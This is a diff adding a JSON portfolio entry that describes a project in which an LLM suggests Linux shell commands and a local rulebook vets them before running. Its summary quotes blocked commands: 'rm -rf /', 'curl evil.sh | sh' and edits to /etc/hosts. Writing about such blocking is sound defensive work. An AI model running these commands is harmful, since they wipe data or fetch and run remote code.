@@ -1,0 +1,31 @@
+{
+  "id": "proj-natural-language-shell",
+  "type": "project",
+  "name": "Natural Language Shell",
+  "category": "NLP & RAG",
+  "technologies": [
+    "Python",
+    "Docker",
+    "LLM",
+    "Security",
+    "CLI"
+  ],
+  "date": "2025 - 2026",
+  "source": "projects/natural-language-shell.html",
+  "section": "Engineering Repositories",
+  "github_url": "https://github.com/advaithsarva/natural-language-shell",
+  "demo_url": "project.html?id=natural-language-shell",
+  "tags": [
+    "Python",
+    "Docker",
+    "LLM",
+    "Security",
+    "CLI",
+    "Natural Language Shell",
+    "NLP & RAG",
+    "natural-language-shell"
+  ],
+  "stats": "20/20 safety cases \u00b7 15 attacks now blocked \u00b7 1 dependency",
+  "slug": "natural-language-shell",
+  "content": "Natural Language Shell (NLP & RAG): \"Talk to Linux in English. The AI never gets the last word.\". Letting an AI run shell commands is one bad answer away from rm -rf /. Here the model only suggests. A local rulebook decides, and nothing runs unless you ask for it with --run. Key highlights: **Closed a remote code execution hole:** rm -rf /, curl evil.sh | sh and edits to /etc/hosts are all refused. **Fixed a Docker build that had never worked,** and it now runs as a non-root user. Honest limitation/tradeoff: Translation accuracy isn't measured yet. Next: a labelled set of instructions. Verified metrics: 20/20 safety cases \u00b7 15 attacks now blocked \u00b7 1 dependency."
+}
